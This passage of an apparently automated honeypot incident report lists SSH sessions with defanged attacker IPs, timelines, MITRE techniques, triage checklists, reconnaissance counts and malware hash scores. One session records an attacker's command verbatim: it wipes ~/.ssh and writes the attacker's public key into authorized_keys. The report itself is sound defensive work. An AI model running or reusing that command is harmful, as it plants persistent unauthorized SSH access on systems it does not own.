- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-953a41f6f306

| Field | Detail |
|---|---|
| **Source IP** | `125.16.27[.]190` |
| **First Seen** | 2026-07-22 08:15 |
| **Last Seen** | 2026-07-22 08:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 08:15:39` | `cowrie.session.connect` |
| `2026-07-22 08:15:39` | `cowrie.client.version` |
| `2026-07-22 08:15:39` | `cowrie.client.kex` |
| `2026-07-22 08:15:40` | `cowrie.login.success` |
| `2026-07-22 08:15:41` | `cowrie.session.params` |
| `2026-07-22 08:15:41` | `cowrie.command.input` |
| `2026-07-22 08:15:41` | `cowrie.command.failed` |
| `2026-07-22 08:15:41` | `cowrie.log.closed` |
| `2026-07-22 08:15:42` | `cowrie.session.params` |
| `2026-07-22 08:15:42` | `cowrie.command.input` |
| `2026-07-22 08:15:43` | `cowrie.session.file_download` |
| `2026-07-22 08:15:43` | `cowrie.log.closed` |
| `2026-07-22 08:15:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.16.27[.]190` to AbuseIPDB if not already reported
- [ ] Block `125.16.27[.]190` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f825133ec6a

| Field | Detail |
|---|---|
| **Source IP** | `125.16.27[.]190` |
| **First Seen** | 2026-07-22 08:15 |
| **Last Seen** | 2026-07-22 08:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 08:15:43` | `cowrie.session.connect` |
| `2026-07-22 08:15:43` | `cowrie.client.version` |
| `2026-07-22 08:15:43` | `cowrie.client.kex` |
| `2026-07-22 08:15:44` | `cowrie.login.success` |
| `2026-07-22 08:15:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.16.27[.]190` to AbuseIPDB if not already reported
- [ ] Block `125.16.27[.]190` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-666d2d9517b2

| Field | Detail |
|---|---|
| **Source IP** | `125.16.27[.]190` |
| **First Seen** | 2026-07-22 08:15 |
| **Last Seen** | 2026-07-22 08:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 08:15:44` | `cowrie.session.connect` |
| `2026-07-22 08:15:44` | `cowrie.client.version` |
| `2026-07-22 08:15:44` | `cowrie.client.kex` |
| `2026-07-22 08:15:45` | `cowrie.login.success` |
| `2026-07-22 08:15:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.16.27[.]190` to AbuseIPDB if not already reported
- [ ] Block `125.16.27[.]190` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22ff8d1dbdec

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-22 08:15 |
| **Last Seen** | 2026-07-22 08:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 08:15:58` | `cowrie.session.connect` |
| `2026-07-22 08:15:58` | `cowrie.client.version` |
| `2026-07-22 08:15:58` | `cowrie.client.kex` |
| `2026-07-22 08:15:58` | `cowrie.login.success` |
| `2026-07-22 08:15:59` | `cowrie.session.params` |
| `2026-07-22 08:15:59` | `cowrie.command.input` |
| `2026-07-22 08:16:00` | `cowrie.log.closed` |
| `2026-07-22 08:16:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0017326fa2bb

| Field | Detail |
|---|---|
| **Source IP** | `14.29.204[.]161` |
| **First Seen** | 2026-07-22 08:18 |
| **Last Seen** | 2026-07-22 08:19 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 08:18:53` | `cowrie.session.connect` |
| `2026-07-22 08:18:53` | `cowrie.client.version` |
| `2026-07-22 08:18:53` | `cowrie.client.kex` |
| `2026-07-22 08:18:57` | `cowrie.login.success` |
| `2026-07-22 08:18:58` | `cowrie.direct-tcpip.request` |
| `2026-07-22 08:19:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.29.204[.]161` to AbuseIPDB if not already reported
- [ ] Block `14.29.204[.]161` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0624ea40b383

| Field | Detail |
|---|---|
| **Source IP** | `178.216.165[.]187` |
| **First Seen** | 2026-07-22 08:19 |
| **Last Seen** | 2026-07-22 08:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 08:19:30` | `cowrie.session.connect` |
| `2026-07-22 08:19:30` | `cowrie.client.version` |
| `2026-07-22 08:19:30` | `cowrie.client.kex` |
| `2026-07-22 08:19:31` | `cowrie.login.success` |
| `2026-07-22 08:19:31` | `cowrie.direct-tcpip.request` |
| `2026-07-22 08:19:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.216.165[.]187` to AbuseIPDB if not already reported
- [ ] Block `178.216.165[.]187` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ce79ae63af2

| Field | Detail |
|---|---|
| **Source IP** | `62.20.205[.]17` |
| **First Seen** | 2026-07-22 08:22 |
| **Last Seen** | 2026-07-22 08:22 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 08:22:09` | `cowrie.session.connect` |
| `2026-07-22 08:22:09` | `cowrie.client.version` |
| `2026-07-22 08:22:09` | `cowrie.client.kex` |
| `2026-07-22 08:22:10` | `cowrie.login.success` |
| `2026-07-22 08:22:10` | `cowrie.direct-tcpip.request` |
| `2026-07-22 08:22:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.20.205[.]17` to AbuseIPDB if not already reported
- [ ] Block `62.20.205[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4f252212625

| Field | Detail |
|---|---|
| **Source IP** | `111.193.181[.]226` |
| **First Seen** | 2026-07-22 08:22 |
| **Last Seen** | 2026-07-22 08:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 08:22:19` | `cowrie.session.connect` |
| `2026-07-22 08:22:20` | `cowrie.client.version` |
| `2026-07-22 08:22:20` | `cowrie.client.kex` |
| `2026-07-22 08:22:21` | `cowrie.login.success` |
| `2026-07-22 08:22:22` | `cowrie.direct-tcpip.request` |
| `2026-07-22 08:22:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.193.181[.]226` to AbuseIPDB if not already reported
- [ ] Block `111.193.181[.]226` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa6f2a8cb5c9

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-22 08:23 |
| **Last Seen** | 2026-07-22 08:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 08:23:37` | `cowrie.session.connect` |
| `2026-07-22 08:23:37` | `cowrie.client.version` |
| `2026-07-22 08:23:38` | `cowrie.client.kex` |
| `2026-07-22 08:23:38` | `cowrie.login.success` |
| `2026-07-22 08:23:39` | `cowrie.session.params` |
| `2026-07-22 08:23:39` | `cowrie.command.input` |
| `2026-07-22 08:23:39` | `cowrie.log.closed` |
| `2026-07-22 08:23:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4504e756d81e

| Field | Detail |
|---|---|
| **Source IP** | `82.65.140[.]218` |
| **First Seen** | 2026-07-22 08:28 |
| **Last Seen** | 2026-07-22 08:28 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 08:28:30` | `cowrie.session.connect` |
| `2026-07-22 08:28:31` | `cowrie.client.version` |
| `2026-07-22 08:28:31` | `cowrie.client.kex` |
| `2026-07-22 08:28:31` | `cowrie.login.success` |
| `2026-07-22 08:28:32` | `cowrie.direct-tcpip.request` |
| `2026-07-22 08:28:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.65.140[.]218` to AbuseIPDB if not already reported
- [ ] Block `82.65.140[.]218` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d0dfedf7a7f

| Field | Detail |
|---|---|
| **Source IP** | `14.98.28[.]43` |
| **First Seen** | 2026-07-22 08:28 |
| **Last Seen** | 2026-07-22 08:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 08:28:41` | `cowrie.session.connect` |
| `2026-07-22 08:28:42` | `cowrie.client.version` |
| `2026-07-22 08:28:42` | `cowrie.client.kex` |
| `2026-07-22 08:28:44` | `cowrie.login.success` |
| `2026-07-22 08:28:44` | `cowrie.direct-tcpip.request` |
| `2026-07-22 08:28:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.98.28[.]43` to AbuseIPDB if not already reported
- [ ] Block `14.98.28[.]43` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-192ab302ceeb

| Field | Detail |
|---|---|
| **Source IP** | `124.239.129[.]2` |
| **First Seen** | 2026-07-22 08:31 |
| **Last Seen** | 2026-07-22 08:31 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 08:31:46` | `cowrie.session.connect` |
| `2026-07-22 08:31:47` | `cowrie.client.version` |
| `2026-07-22 08:31:47` | `cowrie.client.kex` |
| `2026-07-22 08:31:49` | `cowrie.login.success` |
| `2026-07-22 08:31:49` | `cowrie.direct-tcpip.request` |
| `2026-07-22 08:31:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.239.129[.]2` to AbuseIPDB if not already reported
- [ ] Block `124.239.129[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5a129b41b39

| Field | Detail |
|---|---|
| **Source IP** | `2.55.122[.]202` |
| **First Seen** | 2026-07-22 08:31 |
| **Last Seen** | 2026-07-22 08:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 08:31:55` | `cowrie.session.connect` |
| `2026-07-22 08:31:55` | `cowrie.client.version` |
| `2026-07-22 08:31:55` | `cowrie.client.kex` |
| `2026-07-22 08:31:56` | `cowrie.login.success` |
| `2026-07-22 08:31:57` | `cowrie.direct-tcpip.request` |
| `2026-07-22 08:32:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.55.122[.]202` to AbuseIPDB if not already reported
- [ ] Block `2.55.122[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bf525d8fab0

| Field | Detail |
|---|---|
| **Source IP** | `81.237.155[.]113` |
| **First Seen** | 2026-07-22 08:42 |
| **Last Seen** | 2026-07-22 08:42 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 08:42:13` | `cowrie.session.connect` |
| `2026-07-22 08:42:13` | `cowrie.client.version` |
| `2026-07-22 08:42:13` | `cowrie.client.kex` |
| `2026-07-22 08:42:14` | `cowrie.login.success` |
| `2026-07-22 08:42:14` | `cowrie.direct-tcpip.request` |
| `2026-07-22 08:42:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.237.155[.]113` to AbuseIPDB if not already reported
- [ ] Block `81.237.155[.]113` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9d86adaed4e

| Field | Detail |
|---|---|
| **Source IP** | `125.19.244[.]62` |
| **First Seen** | 2026-07-22 08:42 |
| **Last Seen** | 2026-07-22 08:42 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 08:42:19` | `cowrie.session.connect` |
| `2026-07-22 08:42:19` | `cowrie.client.version` |
| `2026-07-22 08:42:19` | `cowrie.client.kex` |
| `2026-07-22 08:42:21` | `cowrie.login.success` |
| `2026-07-22 08:42:22` | `cowrie.direct-tcpip.request` |
| `2026-07-22 08:42:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.19.244[.]62` to AbuseIPDB if not already reported
- [ ] Block `125.19.244[.]62` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d8e839cdf7b

| Field | Detail |
|---|---|
| **Source IP** | `218.21.243[.]58` |
| **First Seen** | 2026-07-22 08:43 |
| **Last Seen** | 2026-07-22 08:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 08:43:33` | `cowrie.session.connect` |
| `2026-07-22 08:43:34` | `cowrie.client.version` |
| `2026-07-22 08:43:34` | `cowrie.client.kex` |
| `2026-07-22 08:43:36` | `cowrie.login.success` |
| `2026-07-22 08:43:37` | `cowrie.direct-tcpip.request` |
| `2026-07-22 08:43:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.21.243[.]58` to AbuseIPDB if not already reported
- [ ] Block `218.21.243[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80c9283a7ce5

| Field | Detail |
|---|---|
| **Source IP** | `59.92.51[.]188` |
| **First Seen** | 2026-07-22 08:44 |
| **Last Seen** | 2026-07-22 08:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 08:44:08` | `cowrie.session.connect` |
| `2026-07-22 08:44:08` | `cowrie.client.version` |
| `2026-07-22 08:44:08` | `cowrie.client.kex` |
| `2026-07-22 08:44:10` | `cowrie.login.success` |
| `2026-07-22 08:44:11` | `cowrie.direct-tcpip.request` |
| `2026-07-22 08:44:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.92.51[.]188` to AbuseIPDB if not already reported
- [ ] Block `59.92.51[.]188` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3c6bad3bcff

| Field | Detail |
|---|---|
| **Source IP** | `195.158.26[.]59` |
| **First Seen** | 2026-07-22 08:44 |
| **Last Seen** | 2026-07-22 08:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 08:44:16` | `cowrie.session.connect` |
| `2026-07-22 08:44:16` | `cowrie.client.version` |
| `2026-07-22 08:44:16` | `cowrie.client.kex` |
| `2026-07-22 08:44:18` | `cowrie.login.success` |
| `2026-07-22 08:44:18` | `cowrie.direct-tcpip.request` |
| `2026-07-22 08:44:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.158.26[.]59` to AbuseIPDB if not already reported
- [ ] Block `195.158.26[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `208.109.189[.]59` | **35** | 2026-07-22 05:10 | 2026-07-22 08:53 | 17m | 0 | `T1592` | 🟠 MEDIUM |
| `122.227.103[.]254` | **31** | 2026-07-22 05:49 | 2026-07-22 07:14 | 56m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **10** | 2026-07-22 05:01 | 2026-07-22 08:53 | 0m | 0 | `T1592` | 🟠 MEDIUM |
| `66.132.172[.]186` | **5** | 2026-07-22 05:49 | 2026-07-22 05:50 | 0m | 0 | `T1592` | 🟢 LOW |
| `52.142.44[.]95` | **4** | 2026-07-22 05:07 | 2026-07-22 06:37 | 4m | 0 | `T1592` | 🟢 LOW |
| `172.105.128[.]12` | **3** | 2026-07-22 08:37 | 2026-07-22 08:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]161` | **3** | 2026-07-22 07:52 | 2026-07-22 07:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]162` | **3** | 2026-07-22 06:16 | 2026-07-22 06:16 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]183` | **3** | 2026-07-22 08:48 | 2026-07-22 08:49 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]196` | **3** | 2026-07-22 05:52 | 2026-07-22 05:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]188` | **3** | 2026-07-22 05:50 | 2026-07-22 05:51 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]42` | **3** | 2026-07-22 08:48 | 2026-07-22 08:50 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]87` | **3** | 2026-07-22 08:47 | 2026-07-22 08:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]123` | **3** | 2026-07-22 08:25 | 2026-07-22 08:25 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.238.181[.]92` | **3** | 2026-07-22 06:44 | 2026-07-22 06:44 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]137` | **2** | 2026-07-22 07:23 | 2026-07-22 07:28 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]200` | **2** | 2026-07-22 07:56 | 2026-07-22 07:56 | 0m | 0 | `T1592` | 🟢 LOW |
| `70.166.167[.]33` | **2** | 2026-07-22 07:34 | 2026-07-22 07:49 | 4m | 0 | `T1592` | 🟢 LOW |
| `77.91.118[.]50` | **2** | 2026-07-22 08:15 | 2026-07-22 08:15 | 0m | 0 | `T1592` | 🟢 LOW |
| `1.192.63[.]54` | 1 | 2026-07-22 07:58 | 2026-07-22 08:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `101.126.89[.]164` | 1 | 2026-07-22 07:17 | 2026-07-22 07:19 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.13.190[.]191` | 1 | 2026-07-22 05:31 | 2026-07-22 05:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.165.166[.]208` | 1 | 2026-07-22 08:40 | 2026-07-22 08:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `115.190.166[.]75` | 1 | 2026-07-22 07:21 | 2026-07-22 07:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.223.152[.]94` | 1 | 2026-07-22 08:45 | 2026-07-22 08:45 | 2s | 0 | `T1592` | 🟢 LOW |
| `120.52.18[.]141` | 1 | 2026-07-22 06:28 | 2026-07-22 06:28 | 12s | 0 | `T1592` | 🟢 LOW |
| `122.114.12[.]133` | 1 | 2026-07-22 06:34 | 2026-07-22 06:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `136.116.189[.]132` | 1 | 2026-07-22 05:38 | 2026-07-22 05:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `166.62.102[.]109` | 1 | 2026-07-22 05:12 | 2026-07-22 05:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `174.94.236[.]211` | 1 | 2026-07-22 06:25 | 2026-07-22 06:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `197.232.51[.]170` | 1 | 2026-07-22 08:39 | 2026-07-22 08:39 | 12s | 0 | `T1592` | 🟢 LOW |
| `45.56.79[.]53` | 1 | 2026-07-22 08:35 | 2026-07-22 08:35 | 1s | 0 | `T1592` | 🟢 LOW |
| `46.228.113[.]227` | 1 | 2026-07-22 05:07 | 2026-07-22 05:07 | 12s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]211` | 1 | 2026-07-22 05:39 | 2026-07-22 05:39 | 4s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]187` | 1 | 2026-07-22 07:53 | 2026-07-22 07:53 | 15s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]74` | 1 | 2026-07-22 07:37 | 2026-07-22 07:37 | 3s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | 1 | 2026-07-22 06:04 | 2026-07-22 06:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `8.134.239[.]76` | 1 | 2026-07-22 07:17 | 2026-07-22 07:17 | 0s | 0 | `T1592` | 🟢 LOW |
| `80.250.155[.]76` | 1 | 2026-07-22 06:03 | 2026-07-22 06:03 | 6s | 0 | `T1592` | 🟢 LOW |
| `83.255.209[.]245` | 1 | 2026-07-22 06:45 | 2026-07-22 06:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `90.230.212[.]29` | 1 | 2026-07-22 08:45 | 2026-07-22 08:47 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
